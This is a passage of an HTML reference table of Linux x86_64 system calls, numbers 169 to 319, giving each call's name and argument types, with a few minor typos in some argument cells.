align="center">int magic1</td><td align="center">int magic2</td><td align="center">unsigned int cmd</td><td align="center">void *arg</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">170</td><td align="center">sys_sethostname</td><td align="center">char *name</td><td align="center">int len</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">171</td><td align="center">sys_setdomainname</td><td align="center">char *name</td><td align="center">int len</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">172</td><td align="center">sys_iopl</td><td align="center">unsigned int level</td><td align="center">struct pt_regs *regs</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">173</td><td align="center">sys_ioperm</td><td align="center">unsigned long from</td><td align="center">unsigned long num</td><td align="center">int turn_on</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">174</td><td align="center">sys_create_module</td><td align="center">REMOVED IN Linux 2.6</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">175</td><td align="center">sys_init_module</td><td align="center">void *umod</td><td align="center">unsigned long len</td><td align="center">const char *uargs</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">176</td><td align="center">sys_delete_module</td><td align="center">const chat *name_user</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">177</td><td align="center">sys_get_kernel_syms</td><td align="center">REMOVED IN Linux 2.6</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">178</td><td align="center">sys_query_module</td><td align="center">REMOVED IN Linux 2.6</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">179</td><td align="center">sys_quotactl</td><td align="center">unsigned int cmd</td><td align="center">const char *special</td><td align="center">qid_t id</td><td align="center">void *addr</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">180</td><td align="center">sys_nfsservctl</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">181</td><td align="center">sys_getpmsg</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">182</td><td align="center">sys_putpmsg</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">183</td><td align="center">sys_afs_syscall</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">184</td><td align="center">sys_tuxcall</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">185</td><td align="center">sys_security</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">186</td><td align="center">sys_gettid</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">187</td><td align="center">sys_readahead</td><td align="center">int fd</td><td align="center">loff_t offset</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">188</td><td align="center">sys_setxattr</td><td align="center">const char *pathname</td><td align="center">const char *name</td><td align="center">const void *value</td><td align="center">size_t size</td><td align="center">int flags</td><td align="center"></td></tr><tr><td align="center">189</td><td align="center">sys_lsetxattr</td><td align="center">const char *pathname</td><td align="center">const char *name</td><td align="center">const void *value</td><td align="center">size_t size</td><td align="center">int flags</td><td align="center"></td></tr><tr><td align="center">190</td><td align="center">sys_fsetxattr</td><td align="center">int fd</td><td align="center">const char *name</td><td align="center">const void *value</td><td align="center">size_t size</td><td align="center">int flags</td><td align="center"></td></tr><tr><td align="center">191</td><td align="center">sys_getxattr</td><td align="center">const char *pathname</td><td align="center">const char *name</td><td align="center">void *value</td><td align="center">size_t size</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">192</td><td align="center">sys_lgetxattr</td><td align="center">const char *pathname</td><td align="center">const char *name</td><td align="center">void *value</td><td align="center">size_t size</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">193</td><td align="center">sys_fgetxattr</td><td align="center">int fd</td><td align="center">const har *name</td><td align="center">void *value</td><td align="center">size_t size</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">194</td><td align="center">sys_listxattr</td><td align="center">const char *pathname</td><td align="center">char *list</td><td align="center">size_t size</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">195</td><td align="center">sys_llistxattr</td><td align="center">const char *pathname</td><td align="center">char *list</td><td align="center">size_t size</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">196</td><td align="center">sys_flistxattr</td><td align="center">int fd</td><td align="center">char *list</td><td align="center">size_t size</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">197</td><td align="center">sys_removexattr</td><td align="center">const char *pathname</td><td align="center">const char *name</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">198</td><td align="center">sys_lremovexattr</td><td align="center">const char *pathname</td><td align="center">const char *name</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">199</td><td align="center">sys_fremovexattr</td><td align="center">int fd</td><td align="center">const char *name</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">200</td><td align="center">sys_tkill</td><td align="center">pid_t pid</td><td align="center">ing sig</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">201</td><td align="center">sys_time</td><td align="center">time_t *tloc</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">202</td><td align="center">sys_futex</td><td align="center">u32 *uaddr</td><td align="center">int op</td><td align="center">u32 val</td><td align="center">struct timespec *utime</td><td align="center">u32 *uaddr2</td><td align="center">u32 val3</td></tr><tr><td align="center">203</td><td align="center">sys_sched_setaffinity</td><td align="center">pid_t pid</td><td align="center">unsigned int len</td><td align="center">unsigned long *user_mask_ptr</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">204</td><td align="center">sys_sched_getaffinity</td><td align="center">pid_t pid</td><td align="center">unsigned int len</td><td align="center">unsigned long *user_mask_ptr</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">205</td><td align="center">sys_set_thread_area</td><td align="center">NOT IMPLEMENTED. Use arch_prctl</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">206</td><td align="center">sys_io_setup</td><td align="center">unsigned nr_events</td><td align="center">aio_context_t *ctxp</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">207</td><td align="center">sys_io_destroy</td><td align="center">aio_context_t ctx</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">208</td><td align="center">sys_io_getevents</td><td align="center">aio_context_t ctx_id</td><td align="center">long min_nr</td><td align="center">long nr</td><td align="center">struct io_event *events</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">209</td><td align="center">sys_io_submit</td><td align="center">aio_context_t ctx_id</td><td align="center">long nr</td><td align="center">struct iocb **iocbpp</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">210</td><td align="center">sys_io_cancel</td><td align="center">aio_context_t ctx_id</td><td align="center">struct iocb *iocb</td><td align="center">struct io_event *result</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">211</td><td align="center">sys_get_thread_area</td><td align="center">NOT IMPLEMENTED. Use arch_prctl</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">212</td><td align="center">sys_lookup_dcookie</td><td align="center">u64 cookie64</td><td align="center">long buf</td><td align="center">long len</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">213</td><td align="center">sys_epoll_create</td><td align="center">int size</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">214</td><td align="center">sys_epoll_ctl_old</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">215</td><td align="center">sys_epoll_wait_old</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">216</td><td align="center">sys_remap_file_pages</td><td align="center">unsigned long start</td><td align="center">unsigned long size</td><td align="center">unsigned long prot</td><td align="center">unsigned long pgoff</td><td align="center">unsigned long flags</td><td align="center"></td></tr><tr><td align="center">217</td><td align="center">sys_getdents64</td><td align="center">unsigned int fd</td><td align="center">struct linux_dirent64 *dirent</td><td align="center">unsigned int count</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">218</td><td align="center">sys_set_tid_address</td><td align="center">int *tidptr</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">219</td><td align="center">sys_restart_syscall</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">220</td><td align="center">sys_semtimedop</td><td align="center">int semid</td><td align="center">struct sembuf *tsops</td><td align="center">unsigned nsops</td><td align="center">const struct timespec *timeout</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">221</td><td align="center">sys_fadvise64</td><td align="center">int fd</td><td align="center">loff_t offset</td><td align="center">size_t len</td><td align="center">int advice</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">222</td><td align="center">sys_timer_create</td><td align="center">const clockid_t which_clock</td><td align="center">struct sigevent *timer_event_spec</td><td align="center">timer_t *created_timer_id</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">223</td><td align="center">sys_timer_settime</td><td align="center">timer_t timer_id</td><td align="center">int flags</td><td align="center">const struct itimerspec *new_setting</td><td align="center">struct itimerspec *old_setting</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">224</td><td align="center">sys_timer_gettime</td><td align="center">timer_t timer_id</td><td align="center">struct itimerspec *setting</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">225</td><td align="center">sys_timer_getoverrun</td><td align="center">timer_t timer_id</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">226</td><td align="center">sys_timer_delete</td><td align="center">timer_t timer_id</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">227</td><td align="center">sys_clock_settime</td><td align="center">const clockid_t which_clock</td><td align="center">const struct timespec *tp</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">228</td><td align="center">sys_clock_gettime</td><td align="center">const clockid_t which_clock</td><td align="center">struct timespec *tp</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">229</td><td align="center">sys_clock_getres</td><td align="center">const clockid_t which_clock</td><td align="center">struct timespec *tp</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">230</td><td align="center">sys_clock_nanosleep</td><td align="center">const clockid_t which_clock</td><td align="center">int flags</td><td align="center">const struct timespec *rqtp</td><td align="center">struct timespec *rmtp</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">231</td><td align="center">sys_exit_group</td><td align="center">int error_code</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">232</td><td align="center">sys_epoll_wait</td><td align="center">int epfd</td><td align="center">struct epoll_event *events</td><td align="center">int maxevents</td><td align="center">int timeout</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">233</td><td align="center">sys_epoll_ctl</td><td align="center">int epfd</td><td align="center">int op</td><td align="center">int fd</td><td align="center">struct epoll_event *event</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">234</td><td align="center">sys_tgkill</td><td align="center">pid_t tgid</td><td align="center">pid_t pid</td><td align="center">int sig</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">235</td><td align="center">sys_utimes</td><td align="center">char *filename</td><td align="center">struct timeval *utimes</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">236</td><td align="center">sys_vserver</td><td align="center">NOT IMPLEMENTED</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">237</td><td align="center">sys_mbind</td><td align="center">unsigned long start</td><td align="center">unsigned long len</td><td align="center">unsigned long mode</td><td align="center">unsigned long *nmask</td><td align="center">unsigned long maxnode</td><td align="center">unsigned flags</td></tr><tr><td align="center">238</td><td align="center">sys_set_mempolicy</td><td align="center">int mode</td><td align="center">unsigned long *nmask</td><td align="center">unsigned long maxnode</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">239</td><td align="center">sys_get_mempolicy</td><td align="center">int *policy</td><td align="center">unsigned long *nmask</td><td align="center">unsigned long maxnode</td><td align="center">unsigned long addr</td><td align="center">unsigned long flags</td><td align="center"></td></tr><tr><td align="center">240</td><td align="center">sys_mq_open</td><td align="center">const char *u_name</td><td align="center">int oflag</td><td align="center">mode_t mode</td><td align="center">struct mq_attr *u_attr</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">241</td><td align="center">sys_mq_unlink</td><td align="center">const char *u_name</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">242</td><td align="center">sys_mq_timedsend</td><td align="center">mqd_t mqdes</td><td align="center">const char *u_msg_ptr</td><td align="center">size_t msg_len</td><td align="center">unsigned int msg_prio</td><td align="center">const stuct timespec *u_abs_timeout</td><td align="center"></td></tr><tr><td align="center">243</td><td align="center">sys_mq_timedreceive</td><td align="center">mqd_t mqdes</td><td align="center">char *u_msg_ptr</td><td align="center">size_t msg_len</td><td align="center">unsigned int *u_msg_prio</td><td align="center">const struct timespec *u_abs_timeout</td><td align="center"></td></tr><tr><td align="center">244</td><td align="center">sys_mq_notify</td><td align="center">mqd_t mqdes</td><td align="center">const struct sigevent *u_notification</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">245</td><td align="center">sys_mq_getsetattr</td><td align="center">mqd_t mqdes</td><td align="center">const struct mq_attr *u_mqstat</td><td align="center">struct mq_attr *u_omqstat</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">246</td><td align="center">sys_kexec_load</td><td align="center">unsigned long entry</td><td align="center">unsigned long nr_segments</td><td align="center">struct kexec_segment *segments</td><td align="center">unsigned long flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">247</td><td align="center">sys_waitid</td><td align="center">int which</td><td align="center">pid_t upid</td><td align="center">struct siginfo *infop</td><td align="center">int options</td><td align="center">struct rusage *ru</td><td align="center"></td></tr><tr><td align="center">248</td><td align="center">sys_add_key</td><td align="center">const char *_type</td><td align="center">const char *_description</td><td align="center">const void *_payload</td><td align="center">size_t plen</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">249</td><td align="center">sys_request_key</td><td align="center">const char *_type</td><td align="center">const char *_description</td><td align="center">const char *_callout_info</td><td align="center">key_serial_t destringid</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">250</td><td align="center">sys_keyctl</td><td align="center">int option</td><td align="center">unsigned long arg2</td><td align="center">unsigned long arg3</td><td align="center">unsigned long arg4</td><td align="center">unsigned long arg5</td><td align="center"></td></tr><tr><td align="center">251</td><td align="center">sys_ioprio_set</td><td align="center">int which</td><td align="center">int who</td><td align="center">int ioprio</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">252</td><td align="center">sys_ioprio_get</td><td align="center">int which</td><td align="center">int who</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">253</td><td align="center">sys_inotify_init</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">254</td><td align="center">sys_inotify_add_watch</td><td align="center">int fd</td><td align="center">const char *pathname</td><td align="center">u32 mask</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">255</td><td align="center">sys_inotify_rm_watch</td><td align="center">int fd</td><td align="center">__s32 wd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">256</td><td align="center">sys_migrate_pages</td><td align="center">pid_t pid</td><td align="center">unsigned long maxnode</td><td align="center">const unsigned long *old_nodes</td><td align="center">const unsigned long *new_nodes</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">257</td><td align="center">sys_openat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">int mode</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">258</td><td align="center">sys_mkdirat</td><td align="center">int dfd</td><td align="center">const char *pathname</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">259</td><td align="center">sys_mknodat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">int mode</td><td align="center">unsigned dev</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">260</td><td align="center">sys_fchownat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">uid_t user</td><td align="center">gid_t group</td><td align="center">int flag</td><td align="center"></td></tr><tr><td align="center">261</td><td align="center">sys_futimesat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">struct timeval *utimes</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">262</td><td align="center">sys_newfstatat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">struct stat *statbuf</td><td align="center">int flag</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">263</td><td align="center">sys_unlinkat</td><td align="center">int dfd</td><td align="center">const char *pathname</td><td align="center">int flag</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">264</td><td align="center">sys_renameat</td><td align="center">int oldfd</td><td align="center">const char *oldname</td><td align="center">int newfd</td><td align="center">const char *newname</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">265</td><td align="center">sys_linkat</td><td align="center">int oldfd</td><td align="center">const char *oldname</td><td align="center">int newfd</td><td align="center">const char *newname</td><td align="center">int flags</td><td align="center"></td></tr><tr><td align="center">266</td><td align="center">sys_symlinkat</td><td align="center">const char *oldname</td><td align="center">int newfd</td><td align="center">const char *newname</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">267</td><td align="center">sys_readlinkat</td><td align="center">int dfd</td><td align="center">const char *pathname</td><td align="center">char *buf</td><td align="center">int bufsiz</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">268</td><td align="center">sys_fchmodat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">mode_t mode</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">269</td><td align="center">sys_faccessat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">270</td><td align="center">sys_pselect6</td><td align="center">int n</td><td align="center">fd_set *inp</td><td align="center">fd_set *outp</td><td align="center">fd_set *exp</td><td align="center">struct timespec *tsp</td><td align="center">void *sig</td></tr><tr><td align="center">271</td><td align="center">sys_ppoll</td><td align="center">struct pollfd *ufds</td><td align="center">unsigned int nfds</td><td align="center">struct timespec *tsp</td><td align="center">const sigset_t *sigmask</td><td align="center">size_t sigsetsize</td><td align="center"></td></tr><tr><td align="center">272</td><td align="center">sys_unshare</td><td align="center">unsigned long unshare_flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">273</td><td align="center">sys_set_robust_list</td><td align="center">struct robust_list_head *head</td><td align="center">size_t len</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">274</td><td align="center">sys_get_robust_list</td><td align="center">int pid</td><td align="center">struct robust_list_head **head_ptr</td><td align="center">size_t *len_ptr</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">275</td><td align="center">sys_splice</td><td align="center">int fd_in</td><td align="center">loff_t *off_in</td><td align="center">int fd_out</td><td align="center">loff_t *off_out</td><td align="center">size_t len</td><td align="center">unsigned int flags</td></tr><tr><td align="center">276</td><td align="center">sys_tee</td><td align="center">int fdin</td><td align="center">int fdout</td><td align="center">size_t len</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">277</td><td align="center">sys_sync_file_range</td><td align="center">long fd</td><td align="center">loff_t offset</td><td align="center">loff_t bytes</td><td align="center">long flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">278</td><td align="center">sys_vmsplice</td><td align="center">int fd</td><td align="center">const struct iovec *iov</td><td align="center">unsigned long nr_segs</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">279</td><td align="center">sys_move_pages</td><td align="center">pid_t pid</td><td align="center">unsigned long nr_pages</td><td align="center">const void **pages</td><td align="center">const int *nodes</td><td align="center">int *status</td><td align="center">int flags</td></tr><tr><td align="center">280</td><td align="center">sys_utimensat</td><td align="center">int dfd</td><td align="center">const char *filename</td><td align="center">struct timespec *utimes</td><td align="center">int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">281</td><td align="center">sys_epoll_pwait</td><td align="center">int epfd</td><td align="center">struct epoll_event *events</td><td align="center">int maxevents</td><td align="center">int timeout</td><td align="center">const sigset_t *sigmask</td><td align="center">size_t sigsetsize</td></tr><tr><td align="center">282</td><td align="center">sys_signalfd</td><td align="center">int ufd</td><td align="center">sigset_t *user_mask</td><td align="center">size_t sizemask</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">283</td><td align="center">sys_timerfd_create</td><td align="center">int clockid</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">284</td><td align="center">sys_eventfd</td><td align="center">unsigned int count</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">285</td><td align="center">sys_fallocate</td><td align="center">long fd</td><td align="center">long mode</td><td align="center">loff_t offset</td><td align="center">loff_t len</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">286</td><td align="center">sys_timerfd_settime</td><td align="center">int ufd</td><td align="center">int flags</td><td align="center">const struct itimerspec *utmr</td><td align="center">struct itimerspec *otmr</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">287</td><td align="center">sys_timerfd_gettime</td><td align="center">int ufd</td><td align="center">struct itimerspec *otmr</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">288</td><td align="center">sys_accept4</td><td align="center">int fd</td><td align="center">struct sockaddr *upeer_sockaddr</td><td align="center">int *upeer_addrlen</td><td align="center">int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">289</td><td align="center">sys_signalfd4</td><td align="center">int ufd</td><td align="center">sigset_t *user_mask</td><td align="center">size_t sizemask</td><td align="center">int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">290</td><td align="center">sys_eventfd2</td><td align="center">unsigned int count</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">291</td><td align="center">sys_epoll_create1</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">292</td><td align="center">sys_dup3</td><td align="center">unsigned int oldfd</td><td align="center">unsigned int newfd</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">293</td><td align="center">sys_pipe2</td><td align="center">int *filedes</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">294</td><td align="center">sys_inotify_init1</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">295</td><td align="center">sys_preadv</td><td align="center">unsigned long fd</td><td align="center">const struct iovec *vec</td><td align="center">unsigned long vlen</td><td align="center">unsigned long pos_l</td><td align="center">unsigned long pos_h</td><td align="center"></td></tr><tr><td align="center">296</td><td align="center">sys_pwritev</td><td align="center">unsigned long fd</td><td align="center">const struct iovec *vec</td><td align="center">unsigned long vlen</td><td align="center">unsigned long pos_l</td><td align="center">unsigned long pos_h</td><td align="center"></td></tr><tr><td align="center">297</td><td align="center">sys_rt_tgsigqueueinfo</td><td align="center">pid_t tgid</td><td align="center">pid_t pid</td><td align="center">int sig</td><td align="center">siginfo_t *uinfo</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">298</td><td align="center">sys_perf_event_open</td><td align="center">struct perf_event_attr *attr_uptr</td><td align="center">pid_t pid</td><td align="center">int cpu</td><td align="center">int group_fd</td><td align="center">unsigned long flags</td><td align="center"></td></tr><tr><td align="center">299</td><td align="center">sys_recvmmsg</td><td align="center">int fd</td><td align="center">struct msghdr *mmsg</td><td align="center">unsigned int vlen</td><td align="center">unsigned int flags</td><td align="center">struct timespec *timeout</td><td align="center"></td></tr><tr><td align="center">300</td><td align="center">sys_fanotify_init</td><td align="center">unsigned int flags</td><td align="center">unsigned int event_f_flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">301</td><td align="center">sys_fanotify_mark</td><td align="center">long fanotify_fd</td><td align="center">long flags</td><td align="center">__u64 mask</td><td align="center">long dfd</td><td align="center">long pathname</td><td align="center"></td></tr><tr><td align="center">302</td><td align="center">sys_prlimit64</td><td align="center">pid_t pid</td><td align="center">unsigned int resource</td><td align="center">const struct rlimit64 *new_rlim</td><td align="center">struct rlimit64 *old_rlim</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">303</td><td align="center">sys_name_to_handle_at</td><td align="center">int dfd</td><td align="center">const char *name</td><td align="center">struct file_handle *handle</td><td align="center">int *mnt_id</td><td align="center">int flag</td><td align="center"></td></tr><tr><td align="center">304</td><td align="center">sys_open_by_handle_at</td><td align="center">int dfd</td><td align="center">const char *name</td><td align="center">struct file_handle *handle</td><td align="center">int *mnt_id</td><td align="center">int flags</td><td align="center"></td></tr><tr><td align="center">305</td><td align="center">sys_clock_adjtime</td><td align="center">clockid_t which_clock</td><td align="center">struct timex *tx</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">306</td><td align="center">sys_syncfs</td><td align="center">int fd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">307</td><td align="center">sys_sendmmsg</td><td align="center">int fd</td><td align="center">struct mmsghdr *mmsg</td><td align="center">unsigned int vlen</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">308</td><td align="center">sys_setns</td><td align="center">int fd</td><td align="center">int nstype</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">309</td><td align="center">sys_getcpu</td><td align="center">unsigned *cpup</td><td align="center">unsigned *nodep</td><td align="center">struct getcpu_cache *unused</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">310</td><td align="center">sys_process_vm_readv</td><td align="center">pid_t pid</td><td align="center">const struct iovec *lvec</td><td align="center">unsigned long liovcnt</td><td align="center">const struct iovec *rvec</td><td align="center">unsigned long riovcnt</td><td align="center">unsigned long flags</td></tr><tr><td align="center">311</td><td align="center">sys_process_vm_writev</td><td align="center">pid_t pid</td><td align="center">const struct iovec *lvec</td><td align="center">unsigned long liovcnt</td><td align="center">const struct iovcc *rvec</td><td align="center">unsigned long riovcnt</td><td align="center">unsigned long flags</td></tr><tr><td align="center">312</td><td align="center">sys_kcmp</td><td align="center">pid_t pid1</td><td align="center">pid_t pid2</td><td align="center">int type</td><td align="center">unsigned long idx1</td><td align="center">unsigned long idx2</td><td align="center"></td></tr><tr><td align="center">313</td><td align="center">sys_finit_module</td><td align="center">int fd</td><td align="center">const char __user *uargs</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">314</td><td align="center">sys_sched_setattr</td><td align="center">pid_t pid</td><td align="center">struct sched_attr __user *attr</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">315</td><td align="center">sys_sched_getattr</td><td align="center">pid_t pid</td><td align="center">struct sched_attr __user *attr</td><td align="center">unsigned int size</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">316</td><td align="center">sys_renameat2</td><td align="center">int olddfd</td><td align="center">const char __user *oldname</td><td align="center">int newdfd</td><td align="center">const char __user *newname</td><td align="center">unsigned int flags</td><td align="center"></td></tr><tr><td align="center">317</td><td align="center">sys_seccomp</td><td align="center">unsigned int op</td><td align="center">unsigned int flags</td><td align="center">const char __user *uargs</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">318</td><td align="center">sys_getrandom</td><td align="center">char __user *buf</td><td align="center">size_t count</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">319</td><td align="center">sys_memfd_create</td><td align="center">const char __user *uname_ptr</td><td align="center">unsigned int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td 